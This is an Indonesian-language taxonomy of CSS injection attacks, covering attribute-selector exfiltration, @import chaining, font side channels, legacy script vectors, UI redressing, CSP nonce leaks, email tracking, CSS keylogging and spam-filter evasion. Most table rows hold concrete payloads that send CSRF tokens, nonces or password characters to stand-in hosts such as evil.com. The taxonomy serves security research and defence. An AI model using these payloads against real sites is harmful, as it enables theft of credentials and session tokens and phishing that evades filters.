---
title: "CSS Injection"
description: ""
---

## Struktur Klasifikasi

Taksonomi ini mengorganisir seluruh permukaan serangan CSS Injection berdasarkan tiga sumbu ortogonal:

**Sumbu 1 — Primitif Eksploitasi (Sumbu Primer):** Kemampuan serangan fundamental yang dicapai melalui CSS yang disuntikkan. CSS tidak memiliki eksekusi kode langsung di browser modern, sehingga permukaan serangannya berpusat pada eksfiltrasi data, manipulasi UI, dan kebocoran side-channel — kemampuan yang mem-bypass pertahanan yang berfokus pada skrip seperti CSP. Primitif eksploitasi menentukan apa yang dapat diekstrak atau dimanipulasi oleh penyerang.

**Sumbu 2 — Konteks Injeksi (Sumbu Cross-Cutting):** Lokasi struktural di mana input yang dikontrol penyerang memasuki pipeline parsing CSS. Ini menentukan fitur CSS mana yang tersedia (stylesheet penuh vs. properti tunggal), apakah `@import` atau `@font-face` dapat digunakan, dan batasan apa yang berlaku. Teknik eksfiltrasi yang sama mungkin berhasil atau gagal tergantung sepenuhnya pada di mana injeksi mendarat.

**Sumbu 3 — Skenario Serangan (Sumbu Dampak):** Konsekuensi dunia nyata yang dicapai melalui eksploitasi CSS. Ini memetakan primitif ke dampak konkret — dari pencurian token CSRF hingga pengambilalihan akun penuh melalui rantai kebocoran nonce CSP.

### Ringkasan Sumbu 2: Tipe Konteks Injeksi

| Konteks Injeksi | Kemampuan yang Tersedia | Batasan Utama |
|---|---|---|
| **Tag `<style>` penuh** | Semua fitur CSS: selector, `@import`, `@font-face`, `@media`, animasi | Permukaan serangan terluas; memerlukan HTML injection |
| **Atribut `style`** | Hanya properti elemen tunggal; tidak ada selector, tidak ada `@rules` | Tidak ada attribute selector; terbatas pada eksfiltrasi `url()`, `var()`, `if()` |
| **Kontrol external stylesheet** | CSS penuh dari origin yang dikontrol penyerang via `<link>` atau `@import` | Memerlukan CSP `style-src` untuk mengizinkan domain penyerang |
| **Relative Path Overwrite (PRSSI)** | Konten halaman yang diinterpretasikan ulang sebagai CSS dalam quirks mode | Memerlukan path `<link>` relatif + penanganan path server + tidak ada `X-Content-Type-Options: nosniff` |
| **CSS value injection** | Menyuntikkan ke dalam nilai properti CSS yang ada (misalnya, `color: [INPUT]`) | Bergantung pada konteks; dapat memungkinkan `url()`, `expression()` (lama), atau pemutusan properti |

### Konsep Fundamental: Mengapa CSS Merupakan Permukaan Serangan

CSS injection secara fundamental merupakan kelas **injeksi scriptless**. Browser modern tidak mengeksekusi JavaScript melalui CSS, namun CSS tetap memiliki kemampuan kuat yang dieksploitasi penyerang:

1. **Pemuatan sumber daya** — `url()`, `@import`, `@font-face` memicu permintaan jaringan yang dapat dikontrol oleh penyerang, berfungsi sebagai saluran eksfiltrasi data.
2. **Pencocokan kondisional** — Attribute selector (`input[value^="x"]`), `:has()`, `:valid`, dan query `@media` membuat oracle boolean yang membocorkan state halaman.
3. **Pengukuran layout** — Metrik font, pemicu scrollbar, dan query ukuran container memungkinkan pengukuran tidak langsung dimensi konten, mengonversi teks menjadi sinyal yang dapat dideteksi.
4. **Kontrol visual** — Kontrol penuh atas rendering memungkinkan UI redressing, pemalsuan konten, credential phishing, dan clickjacking tanpa eksekusi skrip.
5. **Pemrosesan filter cross-origin** — Filter SVG yang diterapkan via CSS dapat membaca data piksel dari iframe cross-origin, menciptakan side channel komputasional.

Kombinasi kemampuan-kemampuan ini berarti CSS injection sering mencapai dampak yang sebanding dengan XSS — terutama untuk pencurian data — sambil mem-bypass pertahanan yang dirancang khusus untuk mencegah eksekusi skrip.

---

## §1. Eksfiltrasi Data via Attribute Selector

Primitif CSS injection yang paling banyak diterapkan: menggunakan CSS attribute selector untuk menguji apakah atribut elemen HTML mengandung urutan karakter tertentu, kemudian memicu permintaan jaringan yang membocorkan karakter yang cocok ke server yang dikontrol penyerang.

### §1-1. Pencocokan Prefix Sekuensial

Ekstraksi karakter-per-karakter menggunakan prefix selector `^=` (starts-with).

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Basic prefix exfiltration** | `input[value^="a"]{background:url(https://evil.com/?a)}` — setiap selector yang cocok memicu permintaan yang mengungkap karakter berikutnya | CSS injection dalam konteks `<style>`; data target dalam atribut HTML (`value`, `href`, `action`, dll.) |
| **Hidden input bypass via sibling combinator** | `input[type=hidden][value^="a"] ~ *{background:url(...)}` — hidden input tidak merender background, sehingga selector menargetkan elemen saudara yang dapat dirender | Token target berada dalam input `type="hidden"`; saudara yang dapat dirender ada |
| **Hidden input bypass via selector `:has()`** | `html:has(input[name="csrf"][value^="x"]){background:url(...)}` — pseudo-class `:has()` menerapkan gaya ke parent berdasarkan pencocokan child | Browser modern dengan dukungan `:has()` (Chrome 105+, Firefox 121+, Safari 15.4+) |
| **Suffix matching** | `input[value$="z"]{background:url(...)}` — selector `$=` mencocokkan akhir nilai, memungkinkan ekstraksi prefix + suffix paralel untuk kecepatan 2× | Sama seperti dasar; menggandakan throughput eksfiltrasi |
| **Substring matching** | `input[value*="substr"]{background:url(...)}` — menguji substring arbitrer; dikombinasikan dengan analisis tumpang tindih, nilai penuh dapat direkonstruksi dari satu CSS injection | Berguna ketika hanya ada satu kesempatan injeksi |
| **Ad blocker filter rule exfiltration** | Memanfaatkan aturan filter CSS ad blocker (uBlock Origin, dll.) itu sendiri sebagai side-channel — mengamati mutasi DOM atau perbedaan permintaan jaringan yang dipicu ketika filter kosmetik yang mengandung attribute selector tertentu mencocokkan elemen halaman untuk menyimpulkan data sensitif. Penyerang mendistribusikan daftar filter berbahaya atau menyuntik ke dalam yang sudah ada, menyebabkan ad blocker korban secara otomatis melakukan eksfiltrasi berbasis CSS selector | Korban berlangganan daftar filter kustom/berbahaya, atau saluran distribusi daftar filter dikompromikan; halaman target memiliki struktur DOM yang dapat diprediksi |

### §1-2. Chaining `@import` Rekursif

Eksfiltrasi multi-ronde dinamis di mana server penyerang menghasilkan CSS untuk karakter berikutnya berdasarkan data yang sebelumnya bocor.

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Sequential import chaining (Chrome)** | `@import url(https://evil.com/start)` awal memicu rantai: server menahan koneksi terbuka, menunggu setiap karakter yang bocor via permintaan background-image, kemudian merespons `@import` pending berikutnya dengan selector yang menargetkan posisi karakter berikutnya | CSS injection mendukung `@import`; halaman dapat di-iframe untuk evaluasi ulang stylesheet berulang |
| **Parallel import pre-loading** | Beberapa aturan `@import` dideklarasikan di awal; server menunda setiap respons hingga karakter sebelumnya bocor, kemudian menyajikan ronde selector berikutnya — tidak diperlukan reload halaman | Injeksi `<style>` tunggal dengan beberapa slot `@import` |
| **Firefox single-injection-point variant** | Firefox mengevaluasi ulang stylesheet saat `@import` selesai secara berbeda dari Chrome; satu titik injeksi dengan rantai `@import` bersarang memungkinkan ekstraksi penuh tanpa iframing | Browser Firefox; satu titik injeksi CSS |

### §1-3. Trigger Kondisional CSS Variable

Menggunakan CSS custom property (`var()`) sebagai switch boolean untuk mengontrol pengiriman permintaan.

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Variable-gated background** | `input[value^="a"]{--match:url(https://evil.com/?a)} html{background:var(--match,none)}` — variabel hanya didefinisikan ketika selector cocok, men-gate permintaan background | CSS injection dalam konteks `<style>`; browser modern |
| **Multiple background stacking** | Menetapkan banyak referensi `var()` sebagai beberapa background pada satu elemen (misalnya, `html`), masing-masing di-gate oleh selector yang berbeda — memungkinkan pengujian paralel massal | Elemen mendukung beberapa nilai `background-image` (praktis tidak terbatas) |
| **`if()` conditional chaining** | `style="background:if(style(--val:\"secret\"):url(//evil.com/match);else:none)"` — fungsi CSS `if()` (2025 Chrome) memungkinkan permintaan kondisional dari atribut `style` inline tanpa selector | Dukungan fungsi CSS `if()`; injeksi dalam konteks atribut `style` |
| **`attr()` one-shot extraction** | `input[name="secret"]{background:image-set(attr(value))}` — fungsi `attr()` membaca seluruh nilai atribut dan menggunakannya sebagai URL relatif, membocorkan nilai penuh dalam satu permintaan | Dukungan `attr()` CSS yang diperluas; `image-set()` dengan argumen `attr()` |

### §1-4. Enumerasi Multi-Elemen

Mengekstrak data dari beberapa field form, tautan, dan elemen lainnya secara sistematis.

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Input name and value extraction** | Selector yang menargetkan `input[name^="x"]` membocorkan nama field; dirantai dengan `input[name="fieldname"][value^="y"]` untuk mengekstrak nilai | Beberapa field form di halaman |
| **Form action exfiltration** | `form[action^="x"]{background:url(...)}` membocorkan endpoint pengiriman form | Elemen form dengan atribut `action` |
| **Anchor href extraction** | `a[href^="x"]{background:url(...)}` membocorkan tujuan tautan | Elemen anchor dengan atribut `href` |
| **`:not()` progressive elimination** | `input:not([value^="known1"]):not([value^="known2"])[value^="x"]{...}` mengeliminasi nilai yang sudah ditemukan untuk menargetkan elemen berikutnya | Beberapa elemen bertipe sama dengan nilai berbeda |

---

## §2. Eksfiltrasi Data via Pengukuran Font dan Teks

Teknik lanjutan yang mengekstrak konten teks (bukan hanya atribut) dengan mengeksploitasi rendering font CSS, metrik glyph, dan pengukuran layout — efektif terhadap text node yang tidak memiliki atribut yang dapat dipilih.

### §2-1. Deteksi Lebar Ligatur Font

Font kustom dengan glyph ligatur lebar yang diketahui, dikombinasikan dengan deteksi scrollbar atau ukuran container, mengungkap urutan karakter mana yang ada dalam text node.

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **SVG font ligature + scrollbar trigger** | `@font-face` kustom dengan font SVG mendefinisikan ligatur (misalnya, "sec" → satu glyph lebar tunggal). Diterapkan ke container dengan `overflow:auto` dan lebar terbatas; jika ligatur cocok, lebar glyph memaksa munculnya scrollbar, dapat dideteksi via `scrollbar-gutter` atau `background-image` kondisional pada `::-webkit-scrollbar-thumb` | CSS injection mendukung `@font-face`; teks target dalam container berukuran terbatas; Chrome/Edge (pseudo-elemen scrollbar) |
| **Container query width detection** | Query ukuran `@container` mendeteksi perubahan lebar yang dirender saat font ligatur menggantikan urutan karakter — pencocokan ligatur mengubah lebar container, memicu gaya kondisional yang mengirimkan permintaan jaringan | Browser mendukung CSS Container Queries (`@container`); konteks containment membungkus teks target |
| **Font chaining for sequential extraction** | Beberapa font yang dibuat secara khusus diterapkan secara berurutan; setiap font menggantikan prefix yang diketahui dengan glyph yang berbeda, memungkinkan siklus dinamis melalui substitusi ligatur untuk mengekstrak teks dengan cepat | Beberapa deklarasi `@font-face` diizinkan; kontrol import sekuensial |

### §2-2. Deteksi Karakter Unicode-Range

Menggunakan `@font-face` dengan `unicode-range` untuk mendeteksi karakter mana yang ada dalam konten teks.

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Per-character font probe** | `@font-face{font-family:probe_a;src:url(https://evil.com/?char=a);unicode-range:U+0061}` — font hanya diambil jika karakter 'a' muncul dalam teks di mana font diterapkan | CSS injection mendukung `@font-face`; CSP `font-src` mengizinkan domain penyerang (atau menggunakan URI `data:`) |
| **Charset enumeration** | Dengan mendeklarasikan `@font-face` terpisah untuk setiap karakter dalam alfabet target, penyerang menentukan charset lengkap dari text node dari log server | Cakupan `unicode-range` yang luas; beberapa aturan `@font-face` |
| **Default font metric differential** | Menggunakan font yang sudah terpasang dengan lebar karakter yang berbeda (misalnya, Comic Sans MS vs. monospace) untuk mendeteksi identitas karakter melalui perubahan layout tanpa memuat font eksternal | Tidak diperlukan pemuatan font eksternal; mem-bypass pembatasan `font-src` |

### §2-3. Deteksi Berbasis Scroll dan Animasi

Menggunakan fitur scroll dan animasi CSS untuk membuat oracle pengukuran.

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **`scroll-timeline` content detection** | Fitur CSS `scroll-timeline` dan `animation-timeline` mengikat animasi ke posisi scroll; perubahan konten yang mempengaruhi tinggi scroll memicu state animasi yang berbeda, dapat dideteksi via `background-image` kondisional pada titik progress tertentu | Browser mendukung scroll-driven animation (Chrome 115+) |
| **CSS animation as width oracle** | `@keyframes` yang secara progresif mengubah lebar, dikombinasikan dengan timing `onanimationstart`/`onanimationend` (via CSS transition, bukan JS), mendeteksi kapan lebar konten melewati ambang batas | Dukungan animasi; konten dalam container yang dapat diukur |
| **Scroll-to-Text Fragment (STTF) + `:target`** | Fragmen URL `#:~:text=secret` men-scroll ke teks yang cocok; `:target::before{content:url(https://evil.com/?found)}` mengkonfirmasi teks ada di halaman | Dukungan STTF (Chrome, Edge); gesture aktivasi pengguna atau HTML injection same-origin untuk mem-bypass persyaratan gesture |

---

## §3. Eksekusi Skrip Berbasis CSS (Warisan)

Eksekusi JavaScript langsung melalui properti CSS — eksklusif tersedia di browser warisan. Vektor-vektor ini penting secara historis dan tetap relevan untuk serangan yang menargetkan lingkungan warisan.

### §3-1. Vektor Expression dan Behavior Internet Explorer

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Properti `expression()`** | `background:expression(alert(document.cookie))` — IE mengevaluasi ekspresi JavaScript dalam nilai properti CSS, mengeksekusi ulang setiap reflow | Internet Explorer 5–8 (dihapus dalam mode standar IE9); memaksa docmode 7 di IE 8–10 dapat mengaktifkan kembali |
| **Properti `behavior` (HTC)** | `behavior:url(evil.htc)` memuat file HTML Component yang mengeksekusi skrip dalam konteks halaman | Internet Explorer; file HTC disajikan dari origin yang sama atau tidak ada pembatasan cross-origin |
| **Properti `behavior` (Scriptlet)** | `behavior:url(evil.sct)` memuat file Scriptlet dengan blok `<script>` yang disematkan | Internet Explorer; file SCT dapat diakses |
| **Forced docmode regression** | Menyuntikkan `<meta http-equiv="X-UA-Compatible" content="IE=7">` memaksa IE 8–10 ke document mode 7, mengaktifkan kembali `expression()` | HTML injection + CSS injection di IE 8–10 |

### §3-2. Vektor Binding XBL Firefox

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **`-moz-binding` dengan XBL eksternal** | `style="-moz-binding:url(evil.xml#xss)"` memuat file XBL yang melampirkan skrip ke elemen | Firefox 2 (tanpa pembatasan origin); Firefox 3.0 (same-origin + tipe MIME yang benar) |
| **`-moz-binding` dengan URI `data:`** | `style="-moz-binding:url(data:text/xml,...)"` mem-bypass pembatasan same-origin di Firefox 3.0 dengan menggunakan URI data inline | Firefox 3.0; bypass URI data dari pemeriksaan same-origin |
| **Pembatasan khusus Chrome (Firefox 4+)** | `-moz-binding` dibatasi ke skema `chrome://`, menghilangkan eksekusi XBL yang dapat diakses web | Firefox 4+; vektor sepenuhnya dimitigasi |

---

## §4. Manipulasi UI dan Pemalsuan Konten

CSS injection yang memodifikasi presentasi visual halaman untuk menipu pengguna — memungkinkan phishing, clickjacking, interaction hijacking, dan pemalsuan konten tanpa eksekusi skrip apa pun.

### §4-1. Manipulasi Layout Halaman

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Element repositioning** | `position:absolute; top:0; left:0; z-index:9999` melapisi konten yang dikontrol penyerang di atas elemen halaman yang sah | CSS injection dalam konteks `<style>`; penyerang dapat menyuntikkan elemen HTML yang terlihat (via HTML injection) |
| **Element hiding** | `#real-form{display:none}` menyembunyikan elemen yang sah sementara elemen yang disuntikkan penyerang tetap terlihat | CSS injection + HTML injection untuk konten pengganti |
| **Security warning suppression** | `.security-warning{margin-top:-9999px}` atau `display:none` mendorong indikator keamanan di luar layar | CSS injection yang menargetkan class/ID yang diketahui dari elemen keamanan |
| **Negative margin content shift** | Bagian halaman kritis digeser di luar layar via `margin-top:-9999px` sementara konten yang disuntikkan menggantikan tempatnya | CSS injection dengan HTML injection |

### §4-2. Credential Phishing via CSS

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Fake login overlay** | CSS memposisikan form yang dikontrol penyerang di atas form login yang sebenarnya; `form[action]` dapat diberi gaya agar tampak identik dengan antarmuka yang sah | CSS + HTML injection; pengguna mengirimkan kredensial ke endpoint penyerang |
| **Form action hijacking** | CSS menyembunyikan form yang sah dan menampilkan klon dengan `action` yang mengarah ke server penyerang | HTML/CSS injection gabungan |
| **Input field redirection** | CSS `opacity:0` pada input yang sah, dengan input penyerang diposisikan identik di atasnya; penekanan tombol pergi ke field penyerang | Kontrol CSS posisional yang halus |

### §4-3. Clickjacking Berbasis Filter SVG

Filter SVG yang diterapkan via CSS memungkinkan pembacaan data piksel iframe cross-origin dan pembuatan overlay interaktif dinamis — kelas serangan baru yang mencapai clickjacking tanpa trik transparansi iframe tradisional.

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Cross-origin pixel reading** | `filter:url(#f)` diterapkan ke iframe cross-origin; SVG `feTile` memotong wilayah piksel tertentu, `feColorMatrix` mengekstrak nilai warna — mengungkap state tombol, konten teks, dan perubahan DOM | Filter SVG yang dapat diterapkan ke iframe cross-origin (bergantung pada browser; Firefox bug 2004487) |
| **Logic-gate computation** | `feBlend mode="difference"` mengimplementasikan NOT; `feComposite operator="arithmetic"` mengimplementasikan AND/OR — filter yang dirantai membuat logika yang fungsional lengkap untuk pengambilan keputusan tingkat piksel | Dukungan filter SVG; anggaran komputasi cukup untuk kompleksitas target |
| **Adaptive overlay generation** | Pipeline filter SVG mendeteksi perubahan state DOM (munculnya dialog, pemilihan checkbox, pesan kesalahan) dalam iframe cross-origin dan secara dinamis menyesuaikan UI overlay palsu | Deteksi state tingkat piksel real-time; filter diterapkan ke iframe langsung |
| **QR code generation for exfiltration** | `feDisplacementMap` dengan tabel lookup koreksi kesalahan Reed-Solomon yang telah dihitung sebelumnya mengkodekan data yang diekstrak ke dalam kode QR yang dapat dipindai yang dirender seluruhnya dalam filter SVG | Pengguna memindai kode QR (social engineering); data sesuai kapasitas QR |
| **Fake CAPTCHA text extraction** | `feTurbulence` + `feDisplacementMap` mendistorsi teks iframe agar tampak sebagai CAPTCHA; pengguna secara manual mengetik ulang teks yang terlihat, mengeksfiltrasinya melalui input mereka | Social engineering; iframe target mengandung teks yang dapat diekstrak |

### §4-4. CSS-Only Interaction Hijacking

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Pointer-events passthrough** | `pointer-events:none` pada overlay memungkinkan klik melewati ke iframe tersembunyi di bawah, mencapai clickjacking tanpa iframe yang terlihat | CSS mengontrol pointer event; halaman target dapat di-frame |
| **Cursor manipulation** | `cursor:url(fake-cursor.png) offset, auto` menciptakan offset kursor visual dari posisi kursor sebenarnya, menyebabkan pengguna mengklik target yang tidak diinginkan | Dukungan kursor kustom; perhitungan offset yang presisi |
| **Content-visibility auto-state** | `content-visibility:auto` + `oncontentvisibilityautostatechange` membuat event yang aktif secara otomatis yang terikat ke state layout CSS | Browser mendukung properti `content-visibility` |

### §4-5. Dangling Markup via CSS

Parsing fungsi `url()` CSS dapat menangkap HTML berikutnya sebagai bagian dari string URL yang tidak berakhir, mengeksfiltrasi konten halaman tanpa eksekusi skrip.

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Unterminated `url()` capture** | `background:url('https://evil.com/?` — parser CSS membaca karakter hingga tanda kutip yang cocok berikutnya, mengonsumsi konten HTML berikutnya sebagai bagian dari URL. Ini menangkap konten halaman (token, data form, teks) dan mengirimkannya ke server penyerang sebagai parameter URL | CSS injection sebelum konten halaman sensitif; CSP mengizinkan permintaan gambar ke domain penyerang |
| **`@import` dangling capture** | `@import 'https://evil.com/?` menangkap konten halaman berikutnya hingga delimiter tanda kutip yang cocok berikutnya | Mirip dengan varian `url()`; `@import` di awal konteks CSS yang disuntikkan |
| **Font-face source dangling** | `@font-face{font-family:x;src:url('https://evil.com/?` menangkap konten ke dalam URL sumber font | `@font-face` diizinkan; CSP `font-src` mengizinkan domain penyerang |

---

## §5. Kebocoran CSP Nonce dan Token

Teknik spesifik CSS untuk mengekstrak nonce Content Security Policy dan token autentikasi — rantai utama melalui mana CSS injection meningkat ke eksekusi skrip penuh.

### §5-1. Eksfiltrasi CSP Nonce via Attribute Selector

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Script nonce attribute leakage** | `script[nonce^="a"]{background:url(https://evil.com/?a)}` mengiterasi melalui karakter nonce via prefix selector | Nilai nonce ada dalam atribut DOM `nonce`; **Catatan**: browser modern menghapus atribut konten `nonce` setelah parsing, membuat ini tidak efektif di Chrome 61+/Firefox 75+ |
| **Meta tag CSP nonce leakage** | `meta[content*="nonce-abc"]{background:url(https://evil.com/?abc)}` — ketika CSP dikirimkan via `<meta http-equiv="Content-Security-Policy">`, nonce muncul dalam atribut `content`, yang tidak seperti `<script nonce>` **tidak** dihapus oleh browser dan tetap dapat diakses oleh CSS selector | CSP dikirimkan via tag `<meta>` (bukan header HTTP); CSS injection ada |
| **Disk-cache nonce reuse** | Setelah membocorkan nonce via CSS, penyerang mengeksploitasi disk cache browser: halaman dengan nonce yang diketahui di-cache, penyerang memperbarui payload yang dapat disuntikkan secara independen (misalnya, via CSRF yang memperbarui input yang disimpan), dan memaksa navigasi melalui bfcache miss (dengan menahan referensi `window.open()`). Browser kembali ke disk cache, memulihkan HTML asli dengan nonce yang bocor sementara konten sisi server sekarang menyertakan `<script nonce="[known]">` | CSS injection; CSP via tag `<meta>`; payload dapat diperbarui secara independen; Chrome disk-cache fallback pada bfcache miss |
| **MathML namespace nonce leak** | Browser menghapus atribut konten `nonce` dari elemen `<script>` setelah parsing untuk mencegah eksfiltrasi CSS, tetapi perlindungan ini tidak berlaku di dalam namespace MathML. Tag `<math>` yang menggantung yang disuntikkan sebelum `<script nonce="...">` target menyebabkan elemen skrip di-parse dalam konteks MathML, di mana atribut `nonce` tetap dapat diakses oleh CSS selector (`script[nonce^="a"]{background:url(...)}`) dan fungsi `attr()`. Gabungkan dengan HTML injection sisi server untuk memposisikan tag `<math>` yang menggantung | CSP dengan kebijakan berbasis nonce (header HTTP atau tag `<meta>`); titik CSS injection di halaman yang sama; HTML injection sisi server untuk menggantungkan `<math>` sebelum elemen `<script nonce>` target |

### §5-2. Ekstraksi Token OAuth dan Sesi

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **CSRF token exfiltration** | `input[name="csrf_token"][value^="x"]{background:url(...)}` — target eksploitasi CSS injection yang paling umum; token CSRF biasanya berada dalam input `type="hidden"`, memerlukan bypass `:has()` atau sibling-combinator | Token CSRF dalam atribut HTML; CSS injection di halaman yang sama |
| **OAuth token leakage** | CSS injection dikombinasikan dengan kesalahan konfigurasi OAuth untuk membocorkan access token korban via attribute selector yang menargetkan elemen yang mengandung token atau redirect URL | CSS injection di halaman callback OAuth; token direfleksikan dalam atribut DOM |
| **Session identifier extraction** | Menargetkan elemen yang mengandung ID sesi, API key, atau bearer token yang dirender dalam atribut DOM | Token sensitif ada dalam atribut HTML yang dapat diakses |

### §5-3. Rantai Eskalasi CSS-ke-XSS

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Nonce leak → script injection** | CSS mengeksfiltrasi nonce CSP (§5-1) → penyerang menyuntikkan `<script nonce="[leaked]">` di titik injeksi terpisah atau via manipulasi cache | Dua titik injeksi (CSS + HTML) atau pengiriman payload berbasis cache |
| **RPO + quirks mode → CSS exfiltration → nonce** | Relative Path Overwrite memaksa konten halaman di-parse sebagai CSS dalam quirks mode; teks yang direfleksikan menjadi CSS selector; dikombinasikan dengan frame-counting sebagai oracle tanpa-permintaan-jaringan untuk membocorkan nonce | Halaman rentan PRSSI; peringatan PHP memaksa quirks mode; input yang direfleksikan |
| **`@import` ke external stylesheet → kontrol CSS penuh** | `@import url(https://evil.com/payload.css)` memuat stylesheet lengkap penyerang, memungkinkan semua teknik §1–§5 | CSP `style-src` mengizinkan domain penyerang atau `*` |

---

## §6. Pelacakan Pengguna dan Fingerprinting

Kemampuan CSS yang mengidentifikasi pengguna, melacak perilaku, dan melakukan fingerprinting lingkungan — terutama relevan dalam konteks email di mana JavaScript diblokir tetapi CSS dieksekusi.

### §6-1. Pelacakan CSS Berbasis Email

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **CSS background-image open tracking** | `background-image:url(https://tracker.com/pixel?uid=X)` dalam HTML email; gambar dimuat ketika email dirender | Klien email merender gambar CSS eksternal (sebagian besar klien kecuali Apple Mail Privacy Protection) |
| **External stylesheet open detection** | `<link rel="stylesheet" href="https://tracker.com/style.css?uid=X">` — Apple Mail memuat awal stylesheet tetapi bukan gambar yang direferensikannya; gambar di dalam CSS hanya dimuat saat dibuka yang sebenarnya | Apple Mail; perbedaan antara prefetch dan pembukaan sebenarnya |
| **Interaction tracking via `:hover`/`:checked`** | `a:hover{background:url(https://tracker.com/?hovered=link1)}` dan `input:checked+label{background:url(...)}` mendeteksi interaksi pengguna dalam email interaktif | Klien email mendukung CSS pseudo-class (dukungan terbatas) |
| **Print detection** | `@media print{body{background:url(https://tracker.com/?action=print)}}` mendeteksi ketika pengguna mencetak email | Klien email mendukung `@media print` |

### §6-2. Fingerprinting Lingkungan via Query `@media`

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Screen resolution detection** | `@media(min-width:1920px){body{background:url(...?w=1920)}}` — media query pada interval 1px mengungkap dimensi viewport yang tepat | CSS injection atau email; browser mengevaluasi media query |
| **Color scheme preference** | `@media(prefers-color-scheme:dark){...url(...?dark=1)}` mendeteksi pengaturan dark mode OS | Browser/klien email mendukung `prefers-color-scheme` |
| **Pointer type detection** | `@media(any-pointer:coarse){...url(...?touch=1)}` membedakan input sentuh vs. mouse | Browser mendukung media feature `any-pointer` |
| **Color depth and HDR detection** | `@media(color-gamut:p3){...}` dan `@media(dynamic-range:high){...}` melakukan fingerprint kemampuan display | Browser modern dengan media feature yang diperluas |
| **Font-based OS detection** | `@font-face{font-family:win;src:local('Segoe UI')}` dikombinasikan dengan elemen yang memicu permintaan jaringan hanya jika font tersedia — Segoe UI mengindikasikan Windows, Helvetica Neue mengindikasikan macOS, Ubuntu/Cantarell mengindikasikan Linux | Probing font `local()`; font bawaan OS dapat dibedakan |

### §6-3. CSS Keylogging

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Input value tracking** | `input[type="password"][value$="a"]{background:url(https://evil.com/?last=a)}` mengirimkan permintaan setiap kali karakter terakhir berubah, mengungkap karakter password saat diketik | **Keterbatasan kritis**: hanya berfungsi jika JavaScript secara dinamis memperbarui atribut `value` untuk mencerminkan konten yang diketik — perilaku browser native tidak memperbarui atribut DOM saat penekanan tombol |
| **React/Vue controlled component keylogging** | Input controlled React (`value={state}`) memperbarui atribut DOM `value` pada setiap penekanan tombol via rekonsiliasi virtual DOM, memungkinkan CSS attribute selector mendeteksi setiap karakter | Aplikasi React/Vue/Angular dengan komponen input yang controlled; CSS injection |

### §6-4. CSS-Assisted Form Spoofing

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Form spoofing via CSS class reuse (Mastodon)** | Pada instance Infosec Mastodon, bypass filter HTML dalam atribut `title` mengizinkan injeksi field `<input>` yang tersembunyi. Alih-alih eksfiltrasi CSS attribute selector, serangan ini menggunakan kembali kelas CSS Mastodon yang ada (misalnya, `react-toggle-track-check` dengan `opacity:0`) untuk secara visual menyembunyikan field username dan password yang disuntikkan — tidak memerlukan CSS inline dan tidak memerlukan bypass CSP. Password autofill Chrome secara otomatis mengisi field yang tersembunyi tanpa interaksi pengguna. Toolbar palsu dengan tombol yang tampak sah mengelilingi input yang tidak terlihat; mengklik tombol mana pun mengirimkan form dengan kredensial yang ditangkap ke server yang dikontrol penyerang via HTTP POST. Menunjukkan bahwa kelas CSS yang ada dapat berfungsi sebagai primitif penyembunyian untuk serangan form-spoofing, memperluas dampak CSS injection melampaui eksfiltrasi data | HTML injection dimungkinkan (bahkan terbatas); aplikasi memiliki kelas CSS yang menghasilkan `opacity:0` atau penyembunyian yang setara; autofill browser diaktifkan; tidak ada direktif CSP `form-action` |

---

## §7. Penghindaran Deteksi via CSS (Konteks Email)

Properti CSS yang dieksploitasi untuk menghindari filter spam, penganalisis konten, dan sistem deteksi merek — kategori serangan yang berbeda di mana CSS adalah mekanisme penghindaran alih-alih payload injeksi.

### §7-1. Hidden Text Salting

Menyisipkan teks yang tidak terlihat via CSS untuk mengganggu mesin deteksi berbasis kata kunci.

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Zero-width character insertion** | Zero-width space (U+200B), zero-width non-joiner (U+200C), dan zero-width joiner (U+200D) yang disisipkan di antara karakter nama merek: `M​i​c​r​o​s​o​f​t` → mengalahkan pencocokan substring | Konteks email; sistem deteksi berbasis teks |
| **`font-size:0` concealment** | `<span style="font-size:0">garbage text</span>` merender teks yang tidak terlihat di antara kata-kata yang sah, membingungkan parser NLP/kata kunci | CSS inline diizinkan oleh klien email |
| **`opacity:0` overlay** | `<span style="opacity:0">irrelevant phrases</span>` membuat teks sepenuhnya transparan | CSS inline; mesin deteksi membaca teks HTML mentah |
| **Color-matching concealment** | `<span style="color:#ffffff">hidden</span>` pada latar belakang putih membuat teks tidak terlihat oleh pembaca manusia | CSS inline; warna latar belakang yang diketahui |
| **Clip/overflow concealment** | `overflow:hidden; width:0; height:0` atau `clip-path:inset(100%)` membuat container tidak terlihat sementara konten ada dalam DOM | CSS inline; mesin parsing membaca teks DOM |
| **Negative text-indent** | `text-indent:-9999px` mendorong teks jauh di luar layar sambil tetap berada dalam DOM | CSS inline; penganalisis konten membaca DOM |

### §7-2. Gangguan Deteksi Bahasa

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Invisible multilingual padding** | Frasa tersembunyi yang disembunyikan CSS dalam berbagai bahasa (misalnya, Jerman, Jepang) yang disematkan dalam email phishing berbahasa Inggris untuk membingungkan model deteksi bahasa seperti Microsoft EOP | Penyembunyian CSS; pemfilteran berbasis bahasa |
